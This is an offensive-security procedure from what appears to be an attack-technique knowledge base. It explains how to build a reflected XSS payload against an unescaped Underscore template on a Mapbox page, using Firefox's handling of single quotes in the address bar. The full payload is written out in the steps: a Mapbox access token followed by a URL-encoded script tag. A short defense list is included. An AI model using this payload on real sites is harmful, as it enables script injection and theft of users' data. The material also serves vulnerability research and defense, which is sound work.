---
id: proc-mapbox-xss-craft-payload
tags:
  - xss
  - payload-crafting
  - firefox
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:25.080Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-XSS-Payload-for-Underscore-Template-Breakout

## Summary

This procedure crafts a proof-of-concept XSS payload that exploits the unescaped Underscore template by breaking out of meta HTML elements using a single quote, tailored for Firefox's lack of encoding in the address bar to inject a script tag.

## Description

The payload appends to the access_token parameter, using a single quote (') to close HTML attributes or tags, followed by URL-encoded script injection. Firefox does not encode the single quote as %27 in the address bar, enabling the breakout. This leads to execution in the page context, allowing data theft or further attacks.

## Requirements

1. Valid Mapbox access_token base (e.g., pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw)
2. Knowledge of HTML escaping and URL encoding
3. Firefox browser for validation

## Defense

Defensive measures and detection strategies:

- URL-encode all query parameters server-side
- Use parameterized queries or template escaping
- Detect payload patterns in access logs

## Objectives

1. Break out of template interpolation context
2. Inject executable script tag
3. Target Firefox-specific behavior

## Instructions

### Step 1: Base Payload Construction

**Context**: Start with a benign access_token and append breakout elements.

Construct: access_token=pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw.'

> The single quote closes the meta content attribute.

### Step 2: Inject Script

**Context**: Add URL-encoded script after breakout.

Full payload: pk.eyJ1IjoiY3Rzd2VicmVxdWVzdCIsImEiOiJTb19VUHM0In0.muGg6tMDG4NOGrV4qQQ8yw.htaccess.aspx'%3E%3Cscript%3Ealert(document.domain)%3C/script%3E

> %3E closes the tag, %3Cscript%3E injects the script, alert tests execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]

## Tags

- [[xss]]
- [[payload-crafting]]
